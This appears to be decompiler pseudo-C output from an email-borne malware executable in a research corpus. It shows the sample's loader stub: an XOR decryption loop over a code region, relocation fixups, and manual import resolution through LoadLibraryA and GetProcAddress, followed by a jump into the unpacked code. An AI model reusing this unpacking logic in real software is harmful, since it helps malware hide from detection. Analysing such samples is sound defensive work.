// subject.c
// Generated on 5/4/2015 12:23:02 AM by decompiling malware_via_email/malware_0101/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 edx, word32 ebx)
{
fn00401000_entry:
l00401000:
	word32 eax_28 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	word32 esi_15 = 0x00000000
	word32 edi_266 = eax_28 + 0x00000015
	branch AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l0040102D
l0040102A:
	edi_266 = eax_28 - 0x0000000D
l0040102D:
	word32 ecx_49 = 0x00000000
l00401032:
	branch esi_15 != edi_266 l00401038
l00401036:
	esi_15 = 0x00000000
l00401038:
	byte v15_66 = Mem0[ecx_49 + 0x00401190:byte] ^ Mem0[esi_15 + 0x00404000:byte]
	Mem67[ecx_49 + 0x00401190:byte] = v15_66
	ecx_49 = ecx_49 + 0x00000001
	esi_15 = esi_15 + 0x00000001
	branch ecx_49 <u 0x00001440 l00401032
l00401058:
	word32 ebx_105 = 0x00000000
	word32 ecx_109 = 0x00402490
	word32 dwLoc08_107 = 0x00000000
l00401074:
	word32 eax_90 = Mem67[ecx_109 + 0x00000004:word32]
	word32 edx_238 = ecx_109 + 0x00000008
	branch eax_90 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004010BA
l00401086:
	word32 esi_237 = eax_90 - 0x00000008 >>u 0x00000001
l00401090:
	word32 eax_240 = (word32) Mem67[edx_238 + 0x00000000:word16]
	branch (eax_240 & 0x0000F000) != 0x00003000 l004010AE
l004010A3:
	word32 eax_256 = (eax_240 & 0x00000FFF) + Mem67[ecx_109 + 0x00000000:word32]
	Mem261[eax_256 + 0x00400F10:word32] = Mem67[eax_256 + 0x00400F10:word32] + 0xF0400F10
l004010AE:
	edx_238 = edx_238 + 0x00000002
	esi_237 = esi_237 - 0x00000001
	branch esi_237 != 0x00000000 l00401090
l004010B6:
	ebx_105 = dwLoc08_107
l004010BA:
	ebx_105 = ebx_105 + Mem67[ecx_109 + 0x00000004:word32]
	dwLoc08_107 = ebx_105
	ecx_109 = ecx_109 + Mem67[ecx_109 + 0x00000004:word32]
	branch ebx_105 <u 0x000000E4 l00401074
l004010CF:
	word32 esi_112 = 0x00401C84
	word32 dwLoc08_113 = 0x00401C84
	esi_142 = esi_112
	branch Mem67[0x00401C94:word32] == 0x00000000 l00401155
l004010E2:
	word32 esi_142
	word32 eax_148 = LoadLibraryA(Mem67[esi_142 + 0x0000000C:word32] + 0x00400F10)
	word32 edx_150 = eax_148
	branch eax_148 == 0x00000000 l00401148
l004010FB:
	word32 ebx_174 = Mem67[esi_142 + 0x00000000:word32]
	branch ebx_174 != 0x00000000 l00401104
l00401101:
	ebx_174 = Mem67[esi_142 + 0x00000010:word32]
l00401104:
	word32 ebx_179 = ebx_174 + 0x00400F10
	word32 esi_182 = Mem67[esi_142 + 0x00000010:word32] + 0x00400F10
	branch Mem67[ebx_179 + 0x00000000:word32] == 0x00000000 l00401144
l00401113:
	goto l00401119
l00401115:
	edx_150 = eax_148
l00401119:
	word32 dwLoc1C_218
	word32 eax_211 = Mem67[ebx_179 + 0x00000000:word32]
	word16 ax_213 = (word16) eax_211
	branch eax_211 >= 0x00000000 l00401128
l00401122:
	dwLoc1C_218 = (word32) ax_213
	goto l0040112D
l00401128:
	dwLoc1C_218 = eax_211 + 0x00400F12
l0040112D:
	Mem223[esi_182 + 0x00000000:word32] = GetProcAddress(edx_150, dwLoc1C_218)
	ebx_179 = ebx_179 + 0x00000004
	esi_182 = esi_182 + 0x00000004
	branch Mem223[ebx_179 + 0x00000000:word32] != 0x00000000 l00401115
l00401144:
	esi_142 = dwLoc08_113
l00401148:
	esi_142 = esi_142 + 0x00000014
	dwLoc08_113 = esi_142
	branch Mem67[esi_142 + 0x00000010:word32] != 0x00000000 l004010E2
l00401155:
	call 0x00401960 (retsize: 4; depth: 28)
	ExitProcess(0x00000000)
fn00401000_exit:
}

